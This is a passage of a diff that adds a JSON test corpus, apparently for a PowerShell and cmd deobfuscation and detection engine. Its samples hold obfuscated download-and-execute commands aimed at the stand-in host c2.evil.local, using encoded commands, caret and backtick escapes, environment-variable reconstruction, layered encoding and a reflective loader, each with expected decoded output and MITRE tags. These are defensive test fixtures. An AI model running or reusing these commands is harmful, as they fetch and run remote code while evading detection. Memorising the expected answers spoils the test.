+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/tinybeacon"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/tinybeacon"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1564.003"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "hidden_window",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "55313a710d0347078394ea3713599f46860f01a83229bfe191aafcb484fde411",
+              "certificate_fingerprint": "5dad3820b8f4e72210b70e6ba2db5aa3040a9b3b3aeb69bf35fa2cfb0d535e0b",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "hidden_window",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS017",
+          "variant": "powershell_encodedcommand_direct",
+          "input": "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAGIANgA0AF8AbwBuAGwAeQAnACkAKQA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/b64_only"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/b64_only"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1105",
+              "T1140"
+            ],
+            "behaviors": [
+              "obfuscated_command_line",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "da9d194e979bdbce207c092eab305d4e96d33c6548ca2670ba07d826f196d42d",
+              "certificate_fingerprint": "b1de003d27825f72570a863a52561a5841d04633639df4bebb9268e507f10b14",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS022",
+          "variant": "powershell_encodedcommand_writehost_phase_r1",
+          "input": "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwBTACAAYgBlAGEAYwBvAG4AIABwAGgAYQBzAGUAIABSADEAIgA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "CS beacon phase R1"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027"
+            ],
+            "behaviors": [
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "19303b499afe40080fd25b3194c2aa3fbf582167331be01e1b585bb8c392cda1",
+              "certificate_fingerprint": "b9a1d5fe7f9dc9ded7832e7ddafedbb02adb60ff07a40bb49d1a1aa3bdf2f428",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command"
+            ]
+          }
+        },
+        {
+          "id": "CS023",
+          "variant": "ps_encodedcommand_ie_alias",
+          "input": "powershell -Enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC4AbABvAGMAYQBsAC8AaQBlAF8AYQBsAGkAYQBzACIAKQApAA==",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/ie_alias"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/ie_alias"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "63f85072f9c27ca27d586d0fc4ecea8b6e82e81336ac8e20f252ebcb84ee6ccf",
+              "certificate_fingerprint": "e6e37a43a56612d7744772478a47d6d7a235b56015ae71de0cd9800300e67c19",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS027",
+          "variant": "ps_encodedcommand_getprocess_discovery",
+          "input": "powershell -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFMAZQBsAGUAYwB0ACAATgBhAG0AZQAsAEkAZAA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Get-Process",
+              "Select",
+              "Name",
+              "Id"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1057",
+              "T1059.001",
+              "T1027"
+            ],
+            "behaviors": [
+              "process_discovery",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "30b807ae571ca5ba37e4aad3fe90fb40d090464bf9ecb6cd4590aa5e5c08ef08",
+              "certificate_fingerprint": "439df9c643a35886bcca15807bee7e52b8032306c54ec9cbdde775b9b35eda4c",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "process_discovery"
+            ]
+          }
+        },
+        {
+          "id": "CS028",
+          "variant": "ps_encodedcommand_reflective_assembly_load_stub",
+          "input": "powershell -Enc JABiAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAGQAbABsACcAKQA7ACAAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "DownloadData",
+              "http://c2.evil.local/dll",
+              "Reflection.Assembly",
+              "Load"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/dll"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1105",
+              "T1620"
+            ],
+            "behaviors": [
+              "reflective_load",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "12c78c1f21e8fd6151b57498babfc2581ac62a4a5a63339d0b7d02e529374ce0",
+              "certificate_fingerprint": "b0671907911bddbc6d2b832dadc34dde19e4ee56a247d92b5c78ab432b114033",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "encoded_command",
+              "reflective_loader"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "cmd_caret_powershell_handoff",
+      "display_name": "CMD Caret \u2192 PowerShell Handoff (Emotet-style)",
+      "description": "cmd.exe launches powershell.exe with `^`-escaped characters and/or `-EncodedCommand` \u2014 Emotet/QakBot signature staging pattern.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1059.003",
+        "T1105",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "CS010",
+          "variant": "cmd_powershell_enc_handoff",
+          "input": "cmd.exe /c powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAQwBvAGIAYQBsAHQAIABTAHQAcgBpAGsAZQAgAGgAYQBuAGQAbwBmAGYAIAB2AGkAYQAgAGMAbQBkACcA",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "Cobalt Strike handoff via cmd"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "85e97e907630e97b96df21118756d8e440dc4e251f21e6bb893b0a8cdb1dba42",
+              "certificate_fingerprint": "f3a3428b57b07dfa75db9a1d6b8a49742732248cf265ff5122e787a1312cbefd",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "cmd_ps_handoff",
+              "encoded_command"
+            ]
+          }
+        },
+        {
+          "id": "CS011",
+          "variant": "cmd_carets_ps_enc_handoff",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAHgAJwApAA==",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/x"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/x"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "70878c62f9e880bebd2a195def9a0d11e32dd3474d0018a648b60b54b6910d92",
+              "certificate_fingerprint": "a388412b2d1c74a3b415bce9bde28a564cfc0fdccf06be3272b5f448294c0ae2",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS021",
+          "variant": "cmd_caret_ps_enc_emotet_style_cs",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^n^c SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAGUAbQBvAHQAZQB0AF8AcwB0AHkAbABlAF8AYwBzACcAKQApAA==",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/emotet_style_cs"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/emotet_style_cs"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "9258277f39a1f20f947b4ba6dbee52e328c87889c45fd3d4534c5e8f3b08fbf6",
+              "certificate_fingerprint": "6b31f19b015034e16a8869cc256014e17489f3d7d58335135bc8a053b794833b",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        },
+        {
+          "id": "CS024",
+          "variant": "cmd_caret_over_ps_enc_iex",
+          "input": "c^m^d /c p^ow^ers^he^ll -Enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAAvAG4AZQBzAHQAZQBkAF8AYwBzACIAKQApAA==",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/nested_cs"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/nested_cs"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "1e096813677d50734a06539e3c38392a46eebac1e5abed70244d9adea2230e21",
+              "certificate_fingerprint": "a592c94dfc273f35f41b0b59600389654ea4d39a2687413184b77a476381218a",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "env_var_reconstruction",
+      "display_name": "Environment-Variable Slice + [string]::Join Reconstruction",
+      "description": "`powershell.exe` command name and switches reconstructed at runtime from `$env:ComSpec[..]`, `$env:PATH[..]` and `[string]::Join()`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "CS012",
+          "variant": "env_slice_string_join_reconstruction",
+          "input": "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/env_reconstructed')\" )",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "env-substitute",
+              "string-index-fold",
+              "structural-fold"
+            ],
+            "final_output_contains": [
+              "c2.evil.local/env_reconstructed",
+              "DownloadString"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/env_reconstructed"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "env_var_slicing",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "2bae6a7a3db60c5b33270b8e50fa4f9d16ab9f6dc1d68b55437dff5552ed43d5",
+              "certificate_fingerprint": "853a4cf71faa06ad997c77374b40670ae3fd7ca23e47dd001f4f88a3e75969f1",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "env_var_reconstruction",
+              "join_array_reconstruction",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "nested_multi_layer_encoding",
+      "display_name": "Nested Multi-Layer Encoding (Hex\u2192Base64\u2192UTF-16LE)",
+      "description": "Payload wrapped in three sequential encodings: raw hex over base64 over UTF-16LE \u2014 the engine must peel each layer in one convergence run.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.001"
+      ],
+      "samples": [
+        {
+          "id": "CS016",
+          "variant": "hex_over_b64_over_utf16le",
+          "input": "53514246414667414b41416f414534415a514233414330415477426941476f415a51426a414851414941424f4147554164414175414663415a51426941454d4162414270414755416267423041436b414c6742454147384164774275414777416277426841475141557742304148494161514275414763414b41416e4147674164414230414841414f6741764143384159774179414334415a51423241476b4162414175414777416277426a4147454162414176414767415a514234414638415977426f4147454161514275414363414b51417041413d3d",
+          "expected": {
+            "interpreter": null,
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "hex-decode",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://c2.evil.local/hex_chain"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/hex_chain"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1105",
+              "T1140",
+              "T1059.001"
+            ],
+            "behaviors": [
+              "multi_layer_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "9318e6b0f78e1bbdcbcf8e501530417e4badbec4ad02da91de5ad243f6c3698e",
+              "certificate_fingerprint": "8767f5f378064587c7dac8745cd0fdc20af89b633ceaafbc159582c30035da89",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "multi_layer_encoding",
+              "download_cradle"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "backtick_alias_obfuscation",
+      "display_name": "Backtick Alias Obfuscation",
+      "description": "Backtick escape characters inserted mid-identifier (`i`w`r`, `i`e`x`) to break signature matching.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "CS018",
+          "variant": "backtick_alias_noise_iwr_iex",
+          "input": "i`wr https://c2.evil.local/backtick_beacon -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://c2.evil.local/backtick_beacon",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/backtick_beacon"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c8a5ee7471706fd4ef86d3c7afc5232993203bb4bd2353f6b9605bf13185a3db",
+              "certificate_fingerprint": "56b1ed3e17fcca934b4b82e203559a06cf83e1ffeedf77d3ba71eb402487ee1a",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ]
+          }
+        },
+        {
+          "id": "CS025",
+          "variant": "backtick_iwr_useb_iex_sq",
+          "input": "i`w`r 'http://c2.evil.local/backticked_url' -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://c2.evil.local/backticked_url",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://c2.evil.local/backticked_url"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "3e01e49ce6462dcb9b313237b188aadf1c4d320832a1495271ffcec8282310b6",
+              "certificate_fingerprint": "dada1531028512c13f8d05281b404a7efa9f1e52dc8194794ff82bb545af316c",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ]
+          }
+        },
+        {
+          "id": "CS029",
+          "variant": "iwr_iex_backtick_on_iex",
+          "input": "iwr https://c2.evil.local/cs29 -useb | i`e`x",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://c2.evil.local/cs29",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/cs29"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "4d5f44f7a163eca4d761b907782a073dba211706faa77f4db211598e2986c316",
+              "certificate_fingerprint": "5b0a7ed23937de6d65cabcbed8e476f6384639176ea3717629e38c3c9cffb1c6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:22:31+00:00"
+            },
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ]
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
